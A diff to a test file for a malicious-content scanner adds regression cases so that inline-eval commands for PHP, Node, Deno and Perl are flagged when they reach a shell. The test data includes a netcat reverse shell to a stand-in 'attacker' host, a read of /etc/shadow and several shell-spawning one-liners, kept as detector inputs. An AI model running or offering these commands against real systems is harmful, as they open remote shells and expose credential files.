@@ -332,11 +332,35 @@ describe('scanForMaliciousContent — command-injection surfaces', () => {
       'python -c "import yaml; print(yaml.safe_load(open(1)))"',
       'node -e "console.log(1)"',
       'python3 -c "print(1)"',
+      'node -p "process.version"',
+      'node --print "process.version"',
+      'deno --version',
+      'php --version',
     ]
     for (const cmd of cases) {
       const { findings } = scanForMaliciousContent(mission(cmd))
       expect(findingTypes(findings)).not.toContain('Interpreter -c/-e invokes shell primitive')
     }
+  })
+
+  // Regression: the `Interpreter -c/-e invokes shell primitive` rule only
+  // accepted `-[ceE]` as the inline-code flag, letting `php -r`, Node's
+  // `-p`/`--print`/`--eval`, Deno's `eval` subcommand, and Perl's `qx{}`
+  // inline shell exec sneak past even though those are the standard
+  // inline-eval invocations for those runtimes (kubestellar/console-kb#3511).
+  it.each([
+    ['php -r \'system("id");\''],
+    ['php -r \'exec("nc attacker 4444 -e /bin/sh");\''],
+    ['node -p \'require("child_process").execSync("id")\''],
+    ['node --print \'require("child_process").execSync("id")\''],
+    ['node --eval \'require("child_process").execSync("id")\''],
+    ['deno eval \'new Deno.Command("sh",{args:["-c","id"]}).spawn()\''],
+    ['deno eval \'Deno.run({cmd:["sh","-c","id"]})\''],
+    ['perl -e \'qx{cat /etc/shadow}\''],
+    ['perl -e \'print qx/id/\''],
+  ])('flags non-`-c/-e` interpreter inline-eval reaching a shell primitive: %s', (cmd) => {
+    const { findings } = scanForMaliciousContent(mission(cmd))
+    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
   })
 
   it('flags awk BEGIN{system(...)} interpreter escape', () => {
